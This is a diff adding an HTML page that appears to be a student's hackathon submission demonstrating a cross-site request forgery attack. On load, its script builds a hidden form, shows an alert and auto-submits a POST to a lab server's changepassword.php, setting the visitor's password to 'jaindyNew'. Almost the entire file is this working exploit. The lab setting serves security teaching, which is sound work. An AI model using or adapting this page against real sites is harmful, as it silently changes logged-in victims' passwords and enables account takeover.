@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>waph-hackathon4: Cross site Request attack</title>
+</head>
+<body>
+
+<h1>By jaindy</h1>
+<script>
+	
+
+function CSRF(){
+	var form= document.createElement('form');
+	form.action='https://waph-hackathon.eastus.cloudapp.azure.com/csrf/changepassword.php';
+	form.method='POST';
+	form.target='self';
+	form.innerHTML='<input type="hidden" name="newpassword" value="jaindyNew"/>';
+	document.body.appendChild(form);
+	alert('CSRF attack forhacakthon4 is about to happen- by jaindy');
+	form.submit();
+}
+
+CSRF();
+</script>
+
+</body>
+</html>
+
+
